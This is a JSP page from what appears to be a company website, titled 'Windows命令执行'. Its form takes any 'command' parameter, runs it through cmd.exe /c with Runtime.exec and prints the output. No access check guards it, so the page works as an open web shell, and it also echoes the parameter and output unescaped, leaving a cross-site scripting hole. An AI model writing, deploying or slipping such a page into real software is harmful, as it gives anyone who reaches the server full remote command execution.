



<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8" import="love.linyi.controller.Code"%>
<%@ page import="java.io.*" %>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/pages/css/linyistyle.css">
    <title>Windows命令执行</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }

        pre { 
            background-color: #f0f0f0; 
            padding: 10px; 
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        form { margin-bottom: 20px; }
        input[type="text"] { width: 70%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; }
        .warning {
            color: red;
            background-color: #ffecec;
            padding: 10px;
            border: 1px solid red;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .card-container {
            max-width:none;
            margin: 0rem ;
            padding: 5rem;
            display:grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            background:rgba(198, 18, 18, 0.5);

        }

        .card {
            background: rgb(191, 207, 221);
            color: rgb(29, 24, 24);
            border-radius: 10px;
            padding: 2rem;
            box-shadow: var(--box-shadow);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-20px);
            box-shadow: 50px 8px 12px rgba(0, 0, 0, 0.2);
        }

        /* 动画效果 */
        @keyframes fadeIn {
            from { opacity: 0.5; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            animation: fadeIn 1s ease forwards;
        }

        /* 响应式设计 */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .hero-content h1 {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
<nav class="navbar">
    <div class="nav-container">
        <a href="#" class="logo">霖依智造</a>
        <i class="fas fa-bars menu-toggle" onclick="toggleMenu()"></i> <!-- 添加汉堡菜单 -->
        <div class="nav-links" id="navLinks">
            <a href="<%=request.getSession().getAttribute("user")==null?Code.host+"main.jsp":"#" %>"
               class="nav-link" ><%=request.getSession().getAttribute("user")%></a>
            <a href="<%=Code.host %>pages/maint.jsp" class="nav-link">首页</a>
            <a href="#" class="nav-link">产品</a>
            <a href="<%=Code.host %>pages/fuwu.jsp" class="nav-link">服务</a>
            <a href="<%=Code.host %>pages/man.jsp" class="nav-link">关于</a>
            <a href="#" class="nav-link">联系</a>
        </div>
    </div>
</nav>

<main>
    <section class="hero">
        <div class="hero-content">
            <h1>mingl</h1>
            <h1><span id="message">m</span></h1>
        </div>
    </section>

    <div class="card-container">
        <div >
            <h1>Windows命令执行</h1>

            <form method="post">
                输入Windows命令:
                <input type="text" name="command" value="<%= request.getParameter("command") != null ?
            request.getParameter("command") : "ipconfig" %>">
                <input type="submit" value="执行">
            </form>

            <%
                String userCommand = request.getParameter("command");
                if (userCommand != null && !userCommand.trim().isEmpty()) {
                    StringBuilder output = new StringBuilder();
                    Process process = null;
                    BufferedReader reader = null;

                    try {
                        String[] cmdArray = {"cmd.exe", "/c", userCommand};

                        process = Runtime.getRuntime().exec(cmdArray);

                        reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            output.append(line).append("\n");
                        }

                        reader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
                        while ((line = reader.readLine()) != null) {
                            output.append("[ERROR] ").append(line).append("\n");
                        }

                        int exitValue = process.waitFor();
                        output.append("\n命令执行完成，退出码: ").append(exitValue);

                    } catch (Exception e) {
                        output.append("执行命令时出错: ").append(e.toString());
                    } finally {
                        if (reader != null) {
                            try { reader.close(); } catch (IOException e) {}
                        }
                        if (process != null) {
                            process.destroy();
                        }
                    }
            %>

            <h3>执行结果:</h3>
            <pre><%= output.toString() %></pre>
            <%
                }
            %>
        </div>
    </div>
</main>

<footer>
    <div class="footer-content">
        <div>
            <h3>联系我们</h3>
            <p>电话: (+86) 19807393661</p>

            <p>邮箱： <a href="https://mail.qq.com/" id="copyContent" onclick="copyToClipboard()"> 3390351358@qq.com</a></p>
            <p><a href="https://beian.miit.gov.cn">湘公网安备30174248163393967号</a></p>
        </div>
        <div>
            <h3>关注我们</h3>
            <div class="social-links">
                <a href="#" class="social-link"><i class="fab fa-weibo"></i></a>
                <a href="#" class="social-link"><i class="fab fa-weixin"></i></a>
                <a href="#" class="social-link"><i class="fab fa-github"></i></a>
            </div>
        </div>
    </div>
</footer>

</body>
</html>